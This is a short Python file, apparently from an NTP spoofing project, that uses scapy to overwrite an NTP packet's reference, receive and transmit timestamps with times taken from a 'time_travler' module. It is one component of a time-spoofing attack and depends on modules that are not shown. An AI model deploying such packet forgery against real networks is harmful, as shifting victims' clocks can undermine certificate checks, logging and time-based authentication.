from scapy.all import NTP,EDecimal
from spoofing.objects import ntp_time
from spoofing.spoofers.time_travler import time 
def ntp_spoof(packet):
    refnew = EDecimal(float(ntp_time.NtpTime.convertUnixTONtpDate(time())))
    recvNew = EDecimal(float(ntp_time.NtpTime.convertUnixTONtpDate(time())))
    sentNew = EDecimal(float(ntp_time.NtpTime.convertUnixTONtpDate(time())))
    packet[NTP].ref = refnew 
    packet[NTP].recv = recvNew
    packet[NTP].sent = sentNew
    ntpdiff= packet[NTP]
    return ntpdiff 